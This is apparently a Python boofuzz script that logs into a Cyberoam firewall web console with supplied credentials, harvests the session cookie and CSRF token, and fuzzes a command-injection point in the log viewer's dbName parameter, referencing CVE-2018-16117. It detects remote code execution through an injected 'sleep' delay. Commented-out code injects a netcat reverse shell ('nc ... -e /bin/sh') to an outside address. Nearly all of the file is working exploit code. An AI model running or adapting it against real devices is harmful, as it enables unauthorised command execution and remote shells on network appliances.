# -*- coding=utf-8 -*-

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

warnings.filterwarnings("ignore", category=UserWarning)

# warnings.filterwarnings("ignore", category=UserWarning, module="boofuzz")  # python3 -W ignore
t = 0


def gt(target, fuzz_data_logger, session, *args, **kwargs):
    global t
    t = time.time()


def ad(target, fuzz_data_logger, session, *args, **kwargs):
    # print(target.recv(1024))
    print('=====================================================')
    global t
    delta_t = time.time() - t
    print("...", delta_t)
    if delta_t >= 6 + 1:  # 3 is specific duration time, 2 second is system use

        print("delta time > specific seconds")
        print(session.last_send)
        fuzz_data_logger.log_check(session.last_send)

    print('=====================================================')


def resp(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    try:
        print(target.recv(1024).decode())
        print("~" * 33)
        fuzz_data_logger.log_check(session.last_send)
        # if 'redirectionURL' in target.recv(10240).decode():
        #     fuzz_data_logger.log_check(session.last_send)
    except:
        fuzz_data_logger.log_fail("Unable to connect ...")
        return

    print('--' * 66)


def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def login_web():
    if len(sys.argv) != 5:
        sys.exit(
            'usage: {} target_ip port username password'.format(sys.argv[0]))

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=sys.argv[1], port=int(sys.argv[2]), sslcontext=ctx)),
        restart_threshold=1,
        # post_test_case_callbacks=[resp],
        post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        pre_send_callbacks=[gt],
        # sleep_time=0.1
    )
    # session.num_mutations(1)

    # 1.login web console
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(sys.argv[1], sys.argv[2]),
                          data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
                              sys.argv[3], sys.argv[4]) + str(int(time.time()) + 3600) + '999', verify=False,
                          headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                                   'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                   'X-Requested-With': 'XMLHttpRequest'})

        # get cookie and jsessionid
        c = r.cookies.items()[0][1]

        print(f"[D] JSESSIONID is: {c}")

        # get csrf_token
        url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2])
        r = requests.get(url=url0, headers={
            'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)

        token = extract_csrf_token(r.text)

        print(f"[D] csrf token is: {token}")

        print("[D] response header: ", r.headers)
        # print(f"[D] response data: {r.text}")  # debug

        if 'Cyberoam.loginUserName = "admin"' in r.text:
            print(f"[I] Login web console success...")

            # test pass 确实要24小时才过期

            # CVE-2018-16117 todo dev
            # ref: https://www.anquanke.com/post/id/214424

            s_initialize(name='rce_fuzz')

            with s_block("Request-Line"):
                # s_static(
                #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))

                s_group("Method", ['POST'])
                s_delim(" ", name='space-1', fuzzable=False)  # fuzz
                # s_static(" ", name='space-1')  # static
                s_static("/webconsole/Controller", name='Request-URI')
                s_delim(" ", name='space-2', fuzzable=False)  # fuzz
                # s_static(" ", name='space-2')
                s_static('HTTP/1.1', name='HTTP-Version')
                s_static("\r\n", name="Request-Line-CRLF")

                s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
                s_static(f"Cookie: JSESSIONID={c}\r\n")
                s_static(
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
                s_static("Accept: text/plain, */*; q=0.01\r\n")
                s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
                s_static("Accept-Encoding: gzip, deflate, br\r\n")
                s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
                s_static("X-Requested-With: XMLHttpRequest\r\n")
                s_static(f"X-Csrf-Token: {token}\r\n")
                s_static("Content-Length: 308\r\n")
                s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")
                s_static(
                    f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
                s_static("Sec-Fetch-Dest: empty\r\n")
                s_static("Sec-Fetch-Mode: cors\r\n")
                s_static("Sec-Fetch-Site: same-origin\r\n")
                s_static("Te: trailers\r\n")
                s_static("Connection: close\r\n")

                s_size('body_content', fuzzable=False, output_format='ascii')

            s_static("\r\n", name="Request-CRLF")

            with s_block('body_content'):
                s_static(
                    "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3Bsleep%20")

                s_random(min_length=1, max_length=1)

                s_static(f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990")

            session.connect(s_get('rce_fuzz'))
            session.fuzz()
            print("-------")

            # session.fuzz()
            # s_initialize('t1-rce_fuzzing')
            # session.connect('t1-rce_fuzzing')
            # session.connect(s_get('t1-rce_fuzzing'))

            # data = "mode=5001&json={}"
            # todo fuzzing
            # fuzz_args = "sleep 6"  # testcase1
            # # fuzz_args = "nc 172.16.16.168 7777 -e /bin/sh"  # testcase2, will keep connection
            # cmd_type = 0
            # if fuzz_args[:5] == "sleep":
            #     fuzz_time_value = int(fuzz_args.split(" ")[1])
            #     cmd_type = 1
            # elif fuzz_args[:2] == "nc":
            #     cmd_type = 2
            #
            # data = f"mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B{fuzz_args}%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}007"
            #
            # # step3(csrf_token, c, url2)
            #
            # headers = {
            #     "Host": "172.16.16.16:4444",
            #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            #     "Accept": "text/plain, */*; q=0.01",
            #     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            #     "Accept-Encoding": "gzip, deflate, br",
            #     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            #     "X-Requested-With": "XMLHttpRequest",
            #     "X-CSRF-Token": token,
            #     "Content-Length": "17",
            #     "Origin": "https://172.16.16.16:4444",
            #     "Connection": "keep-alive",
            #     "Referer": url0,
            #     "Cookie": "JSESSIONID={}".format(c),
            #     "Sec-Fetch-Dest": "empty",
            #     "Sec-Fetch-Mode": "cors",
            #     "Sec-Fetch-Site": "same-origin",
            # }
            #
            # # start_time
            # st = time.time()
            #
            # r = requests.post(url=url3, verify=False,
            #                   data=data, headers=headers)
            #
            # print("[I] step3 response: ", r.text)
            #
            # # computed expired time
            # delta_t = time.time() - st
            # print(f"[D] wait time: {delta_t} seconds")
            #
            # if cmd_type == 1:
            #     if delta_t >= fuzz_time_value:
            #         print("[I] sleep command, RCE success ...")
            # elif cmd_type == 2:
            #     print("[I] please check nc connection ...")

    except Exception as e:
        print(e)


if __name__ == '__main__':
    login_web()
